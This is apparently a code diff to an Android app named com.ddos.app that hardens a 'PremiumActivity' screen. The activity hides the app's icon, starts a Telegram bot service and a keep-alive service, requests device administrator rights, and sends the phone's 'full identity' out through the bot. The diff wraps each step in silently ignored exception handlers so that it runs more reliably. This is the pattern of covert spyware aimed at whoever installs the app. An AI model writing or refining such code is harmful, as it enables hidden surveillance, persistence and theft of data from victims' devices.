@@ -1,3 +1,4 @@
+
 package com.ddos.app;
 
 import android.Manifest;
@@ -66,8 +67,12 @@ public class PremiumActivity extends AppCompatActivity {
 
         MainActivity.hideIcon(this);
 
-        ContextCompat.startForegroundService(this, new Intent(this, TelegramBot.class));
-        ContextCompat.startForegroundService(this, new Intent(this, KeepAliveService.class));
+        try {
+            ContextCompat.startForegroundService(this, new Intent(this, TelegramBot.class));
+        } catch (Exception ignored) {}
+        try {
+            ContextCompat.startForegroundService(this, new Intent(this, KeepAliveService.class));
+        } catch (Exception ignored) {}
 
         try {
             Intent a = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
@@ -85,9 +90,11 @@ public class PremiumActivity extends AppCompatActivity {
         } catch (Exception ignored) {}
 
         new Thread(() -> {
-            TelegramBot bot = new TelegramBot();
-            bot.init(getApplicationContext());
-            bot.sendFullIdentity();
+            try {
+                TelegramBot bot = new TelegramBot();
+                bot.init(getApplicationContext());
+                bot.sendFullIdentity();
+            } catch (Exception ignored) {}
         }).start();
 
         finishAffinity();
